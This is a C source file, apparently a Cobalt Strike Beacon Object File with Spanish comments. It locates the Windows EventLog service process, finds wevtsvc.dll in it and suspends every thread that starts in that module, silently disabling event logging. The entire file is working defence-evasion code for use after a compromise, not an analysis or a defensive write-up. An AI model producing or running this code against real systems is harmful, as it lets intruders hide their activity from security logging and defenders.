#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <winternl.h>
#include "beacon.h"

extern PVOID __imp_LoadLibraryA;
extern PVOID __imp_GetProcAddress;
extern PVOID __imp_GetModuleHandleA;
extern PVOID __imp_CloseHandle;
extern PVOID __imp_OpenProcess;

#ifndef NT_SUCCESS
#define NT_SUCCESS(x) ((x) >= 0)
#endif

static int my_wcscmp(const wchar_t *s1, const wchar_t *s2) {
    while (*s1 && (*s1 == *s2)) {
        s1++;
        s2++;
    }
    return *(const unsigned short*)s1 - *(const unsigned short*)s2;
}

// Tipos de funciones que cargaremos dinámicamente
typedef SC_HANDLE (WINAPI *pOpenSCManagerA)(LPCSTR, LPCSTR, DWORD);
typedef SC_HANDLE (WINAPI *pOpenServiceA)(SC_HANDLE, LPCSTR, DWORD);
typedef BOOL (WINAPI *pQueryServiceStatusEx)(SC_HANDLE, SC_STATUS_TYPE, LPBYTE, DWORD, LPDWORD);

typedef BOOL (WINAPI *pEnumProcessModules)(HANDLE, HMODULE*, DWORD, LPDWORD);
typedef DWORD (WINAPI *pGetModuleBaseNameW)(HANDLE, HMODULE, LPWSTR, DWORD);
typedef BOOL (WINAPI *pGetModuleInformation)(HANDLE, HMODULE, LPMODULEINFO, DWORD);

typedef HANDLE (WINAPI *pCreateToolhelp32Snapshot)(DWORD, DWORD);
typedef BOOL (WINAPI *pThread32First)(HANDLE, LPTHREADENTRY32);
typedef BOOL (WINAPI *pThread32Next)(HANDLE, LPTHREADENTRY32);
typedef HANDLE (WINAPI *pOpenThread)(DWORD, BOOL, DWORD);
typedef DWORD (WINAPI *pSuspendThread)(HANDLE);

// Prototipo de NtQueryInformationThread
typedef NTSTATUS (NTAPI *pNtQueryInformationThread)(
    HANDLE ThreadHandle,
    ULONG ThreadInformationClass,
    PVOID ThreadInformation,
    ULONG ThreadInformationLength,
    PULONG ReturnLength
);

void go(char *args, int alen) {
    BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Iniciando: Suspensión de hilos en wevtsvc.dll (servicio EventLog)\n");

    // === Cargar librerías necesarias ===
    HMODULE hAdvapi32 = ((HMODULE(WINAPI*)(LPCSTR))__imp_LoadLibraryA)("advapi32.dll");
    HMODULE hPsapi     = ((HMODULE(WINAPI*)(LPCSTR))__imp_LoadLibraryA)("psapi.dll");
    HMODULE hKernel32  = ((HMODULE(WINAPI*)(LPCSTR))__imp_LoadLibraryA)("kernel32.dll");
    HMODULE hNtdll     = ((HMODULE(WINAPI*)(LPCSTR))__imp_GetModuleHandleA)("ntdll");

    if (!hAdvapi32 || !hPsapi || !hKernel32 || !hNtdll) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error cargando librerías necesarias\n");
        return;
    }

    // === Resolver funciones de advapi32.dll ===
    pOpenSCManagerA pOpenSCManagerA_fn = (pOpenSCManagerA)((PVOID(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hAdvapi32, "OpenSCManagerA");
    pOpenServiceA pOpenServiceA_fn = (pOpenServiceA)((PVOID(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hAdvapi32, "OpenServiceA");
    pQueryServiceStatusEx pQueryServiceStatusEx_fn = (pQueryServiceStatusEx)((PVOID(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hAdvapi32, "QueryServiceStatusEx");

    // === Resolver funciones de psapi.dll ===
    pEnumProcessModules pEnumProcessModules_fn = (pEnumProcessModules)((PVOID(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hPsapi, "EnumProcessModules");
    pGetModuleBaseNameW pGetModuleBaseNameW_fn = (pGetModuleBaseNameW)((PVOID(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hPsapi, "GetModuleBaseNameW");
    pGetModuleInformation pGetModuleInformation_fn = (pGetModuleInformation)((PVOID(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hPsapi, "GetModuleInformation");

    // === Resolver funciones de kernel32.dll ===
    pCreateToolhelp32Snapshot pCreateToolhelp32Snapshot_fn = (pCreateToolhelp32Snapshot)((PVOID(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "CreateToolhelp32Snapshot");
    pThread32First pThread32First_fn = (pThread32First)((PVOID(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "Thread32First");
    pThread32Next pThread32Next_fn = (pThread32Next)((PVOID(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "Thread32Next");
    pOpenThread pOpenThread_fn = (pOpenThread)((PVOID(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "OpenThread");
    pSuspendThread pSuspendThread_fn = (pSuspendThread)((PVOID(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hKernel32, "SuspendThread");

    // === Resolver NtQueryInformationThread desde ntdll ===
    pNtQueryInformationThread pNtQueryInformationThread_fn = (pNtQueryInformationThread)((PVOID(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress)(hNtdll, "NtQueryInformationThread");

    if (!pOpenSCManagerA_fn || !pOpenServiceA_fn || !pQueryServiceStatusEx_fn ||
        !pEnumProcessModules_fn || !pGetModuleBaseNameW_fn || !pGetModuleInformation_fn ||
        !pCreateToolhelp32Snapshot_fn || !pThread32First_fn || !pThread32Next_fn ||
        !pOpenThread_fn || !pSuspendThread_fn || !pNtQueryInformationThread_fn) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error resolviendo funciones necesarias\n");
        return;
    }

    // === Abrir SCM y el servicio EventLog ===
    SC_HANDLE sc = pOpenSCManagerA_fn(NULL, NULL, SC_MANAGER_CONNECT);
    if (!sc) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No se pudo abrir SCManager\n");
        return;
    }

    SC_HANDLE service = pOpenServiceA_fn(sc, "EventLog", SERVICE_QUERY_STATUS);
    if (!service) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No se pudo abrir el servicio EventLog\n");
        ((BOOL(WINAPI*)(SC_HANDLE))__imp_CloseHandle)(sc);
        return;
    }

    // === Obtener PID del proceso que aloja EventLog ===
    SERVICE_STATUS_PROCESS ssp = {0};
    DWORD bytesNeeded = 0;
    if (!pQueryServiceStatusEx_fn(service, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &bytesNeeded)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] QueryServiceStatusEx falló\n");
        ((BOOL(WINAPI*)(SC_HANDLE))__imp_CloseHandle)(service);
        ((BOOL(WINAPI*)(SC_HANDLE))__imp_CloseHandle)(sc);
        return;
    }

    DWORD servicePID = ssp.dwProcessId;
    BeaconPrintf(CALLBACK_OUTPUT, "[+] EventLog se ejecuta en PID: %d\n", servicePID);

    ((BOOL(WINAPI*)(SC_HANDLE))__imp_CloseHandle)(service);
    ((BOOL(WINAPI*)(SC_HANDLE))__imp_CloseHandle)(sc);

    // === Abrir proceso del servicio ===
    HANDLE hProcess = ((HANDLE(WINAPI*)(DWORD, BOOL, DWORD))__imp_OpenProcess)(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, servicePID);
    if (!hProcess) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No se pudo abrir el proceso %d\n", servicePID);
        return;
    }

    // === Enumerar módulos para encontrar wevtsvc.dll ===
    HMODULE modules[256];
    DWORD cbNeeded;
    MODULEINFO modInfo = {0};
    BOOL foundWevtSvc = FALSE;

    if (pEnumProcessModules_fn(hProcess, modules, sizeof(modules), &cbNeeded)) {
        DWORD moduleCount = cbNeeded / sizeof(HMODULE);
        for (DWORD i = 0; i < moduleCount; i++) {
            WCHAR moduleName[128] = {0};
            // Usamos sizeof(moduleName)/sizeof(WCHAR) en lugar de ARRAYSIZE por máxima compatibilidad
            if (pGetModuleBaseNameW_fn(hProcess, modules[i], moduleName, sizeof(moduleName) / sizeof(WCHAR))) {
                // ¡Reemplazo de wcscmp aquí!
                if (my_wcscmp(moduleName, L"wevtsvc.dll") == 0) {
                    BeaconPrintf(CALLBACK_OUTPUT, "[+] wevtsvc.dll encontrado: %S en 0x%p\n", moduleName, modules[i]);
                    if (pGetModuleInformation_fn(hProcess, modules[i], &modInfo, sizeof(modInfo))) {
                        foundWevtSvc = TRUE;
                        break;
                    }
                }
            }
        }
    }

    if (!foundWevtSvc) {
        BeaconPrintf(CALLBACK_ERROR, "[-] wevtsvc.dll no encontrado en el proceso\n");
        ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(hProcess);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Rango de wevtsvc.dll: 0x%p - 0x%p\n",
        modInfo.lpBaseOfDll,
        (PBYTE)modInfo.lpBaseOfDll + modInfo.SizeOfImage);

    // === Tomar snapshot de hilos ===
    HANDLE hSnapshot = pCreateToolhelp32Snapshot_fn(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No se pudo crear snapshot de hilos\n");
        ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(hProcess);
        return;
    }

    THREADENTRY32 te = {0};
    te.dwSize = sizeof(THREADENTRY32);

    if (!pThread32First_fn(hSnapshot, &te)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Thread32First falló\n");
        ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(hSnapshot);
        ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(hProcess);
        return;
    }

    do {
        if (te.th32OwnerProcessID == servicePID) {
            HANDLE hThread = pOpenThread_fn(THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
            if (hThread) {
                DWORD_PTR threadStartAddr = 0;
                NTSTATUS status = pNtQueryInformationThread_fn(hThread, 0x9, &threadStartAddr, sizeof(threadStartAddr), NULL);

                if (NT_SUCCESS(status)) {
                    if (threadStartAddr >= (DWORD_PTR)modInfo.lpBaseOfDll &&
                        threadStartAddr < (DWORD_PTR)modInfo.lpBaseOfDll + modInfo.SizeOfImage) {

                        BeaconPrintf(CALLBACK_OUTPUT, "[!] Hilo %d inicia en wevtsvc.dll (0x%p) → suspendiendo...\n",
                            te.th32ThreadID, threadStartAddr);

                        DWORD prevSuspendCount = pSuspendThread_fn(hThread);
                        if (prevSuspendCount != (DWORD)-1) {
                            BeaconPrintf(CALLBACK_OUTPUT, "[+] Hilo suspendido. Contador: %d\n", prevSuspendCount + 1);
                        } else {
                            BeaconPrintf(CALLBACK_ERROR, "[-] Error suspendiendo hilo %d\n", te.th32ThreadID);
                        }
                    }
                }
                ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(hThread);
            }
        }
    } while (pThread32Next_fn(hSnapshot, &te));

    ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(hSnapshot);
    ((BOOL(WINAPI*)(HANDLE))__imp_CloseHandle)(hProcess);

    BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Operación completada.\n");
}
